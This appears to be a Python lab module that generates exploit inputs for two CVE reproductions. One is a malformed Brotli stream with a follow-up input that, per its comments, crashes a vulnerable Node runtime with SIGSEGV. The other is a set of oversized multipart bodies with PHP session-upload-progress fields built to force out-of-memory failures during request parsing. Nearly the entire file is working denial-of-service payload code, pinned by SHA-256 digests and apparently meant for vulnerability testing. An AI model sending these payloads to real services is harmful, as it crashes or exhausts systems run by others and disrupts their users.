"""Managed CVE lab implementations retained from both branches."""

import hashlib

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"

# The vulnerable decoder only reaches the unchecked-return path when the
# trigger is followed by three zero bytes and the stream is then ended with
# a short second input, exactly as a streaming consumer would feed it. The
# verified behavior (Node 22.23.3 vs 22.23.4): the two-phase input crashes
# the vulnerable runtime with SIGSEGV; the fixed runtime answers 422
# ERR__ERROR_FORMAT_BLOCK_SWITCH and stays healthy.
TRAILING_ZEROS = b"\x00\x00\x00"
SECOND_INPUT_LENGTH = 127


class _Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes):
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def _one_symbol_tree(bits, alphabet_size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def _varlen_u8(bits, value):
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def trigger_stream() -> bytes:
    """Build the malformed Brotli stream; the digest pin guards every build."""
    bits = _Bits()
    # Window bits, meta-block declaration (ISLAST=0, 4 nibbles, MLEN, not
    # uncompressed).
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    # One block type per category: no switch codes are announced.
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 1)
    _one_symbol_tree(bits, 4, 0)
    _one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)
    _varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 0)
    _one_symbol_tree(bits, 256, 0)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 400, 184)
    # 2^24 insert-copy commands whose announced output is never delivered.
    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1
    group = _Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    stream = bits.finish()
    digest = hashlib.sha256(stream).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger digest mismatch: {digest}")
    return stream


def second_input() -> bytes:
    """The short final input that ends the stream; verified crash delivery."""
    payload = bytearray(SECOND_INPUT_LENGTH)
    payload[7] = 8
    payload[15:19] = (0x7FFFFFFF).to_bytes(4, "little", signed=True)
    payload[19:23] = (0x7FFFFFFF).to_bytes(4, "little")
    payload[23:27] = (0x7FFFFFFF).to_bytes(4, "little")
    return bytes(payload)


def split_input(body: bytes) -> tuple[int, int]:
    """Return the (first, second) phase cut used by the reviewed lab app."""
    first = len(trigger_stream()) + len(TRAILING_ZEROS)
    return first, len(body) - first

# Integrity pins asserted on every build: a run can never carry different
# input than what was reviewed.
OOM_BODY_SHA256 = "058e648c1dff45a42c1a7231aad412b98f685e89c809ec9e6fe686fd6bdcd2af"
OOM_BODY_WITH_PROGRESS_SHA256 = "f3e1c679297bf7bc8c8df378ac95dc25657dd5c2d22506c0723000f785844b28"
CONSUMER_BODY_SHA256 = "b76da585a6490b758ffa370ea5dbc9174e0fc02fdca948136a9a928784767d11"

_BOUNDARY = b"mockforge2026lab"
BOUNDARY = "mockforge2026lab"
# ~100 parts x ~200 KB of part-header padding crosses the reviewed 16M
# memory_limit while staying under the pack's 48 MiB forwarding bound; part
# filenames also push past the configured max_file_uploads, the advisory's
# third exhaustion route.
_PARTS = 100
_PADDING_PER_PART = 200_000
_UPLOAD_PROGRESS_FIELD = b"PHP_SESSION_UPLOAD_PROGRESS"


def _part(index: int, padding: bytes, with_progress: bool = False) -> bytes:
    disposition = (
        f'Content-Disposition: form-data; name="labfield{index}"; '
        f'filename="labfile{index}.bin"\r\n'
    ).encode()
    part = b"--" + _BOUNDARY + b"\r\n" + disposition
    if with_progress and index == 0:
        part += (
            f"Content-Disposition: form-data; name=\"{_UPLOAD_PROGRESS_FIELD.decode()}\"\r\n\r\n"
        ).encode()
        part += b"mockforge-progress-key\r\n"
        part += b"--" + _BOUNDARY + b"\r\n" + disposition
    part += f"X-Lab-Padding-{index}: ".encode() + padding + b"\r\n\r\n"
    return part


def _assemble(parts: list, closing: bytes) -> bytes:
    body = b"".join(parts) + closing
    return body


def oom_body() -> bytes:
    """Producer body: oversized multipart part headers force an OOM bail-out
    during input parsing (the advisory's trigger class for CVE-2026-109618,
    and the producer half of CVE-2026-109619)."""
    padding = b"A" * _PADDING_PER_PART
    parts = [_part(index, padding) for index in range(_PARTS)]
    body = _assemble(parts, b"--" + _BOUNDARY + b"--\r\n")
    if hashlib.sha256(body).hexdigest() != OOM_BODY_SHA256:
        raise RuntimeError("oom_body digest mismatch against the pinned review input")
    return body


def oom_body_with_progress() -> bytes:
    """Producer body for the same-worker pack: identical memory pressure,
    with a session-upload-progress field active so the parse writes
    session state before the OOM (the advisory's producer for the
    session-lifecycle consumer path)."""
    padding = b"A" * _PADDING_PER_PART
    parts = [_part(index, padding, with_progress=(index == 0)) for index in range(_PARTS)]
    body = _assemble(parts, b"--" + _BOUNDARY + b"--\r\n")
    if hashlib.sha256(body).hexdigest() != OOM_BODY_WITH_PROGRESS_SHA256:
        raise RuntimeError("oom_body_with_progress digest mismatch against the pinned review input")
    return body


def consumer_body(token: str = "mockforge-progress-key") -> bytes:
    """Consumer body: a small multipart upload-progress request whose
    pre-application consumer touches worker-global state (the advisory's
    consumer for CVE-2026-109619; session upload progress is enabled by
    default and needs no application code)."""
    part = (
        b"--"
        + _BOUNDARY
        + b"\r\n"
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + token.encode()
        + b"\r\n"
        + b"--"
        + _BOUNDARY
        + b"--\r\n"
    )
    if hashlib.sha256(part).hexdigest() != CONSUMER_BODY_SHA256:
        raise RuntimeError("consumer_body digest mismatch against the pinned review input")
    return part


def digest_of(body: bytes) -> str:
    return hashlib.sha256(body).hexdigest()
